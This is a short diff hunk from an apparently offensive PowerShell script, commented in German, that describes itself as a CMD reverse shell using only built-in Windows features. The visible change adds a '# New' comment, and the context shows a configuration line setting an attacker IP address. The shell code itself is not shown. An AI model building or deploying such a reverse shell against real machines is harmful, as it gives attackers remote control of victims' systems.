@@ -1,5 +1,6 @@
 # PowerShell-only CMD Reverse Shell (ohne Installationen oder externe Tools)
 # Dieses Skript verwendet nur integrierte Windows-Funktionen, um eine CMD-Reverse-Shell zu erstellen.
+# New
 
 # --- KONFIGURATION START ---
 $ip = "192.168.2.127"  # <--- HIER IHRE ANGREIFER-IP-ADRESSE EINGEBEN!
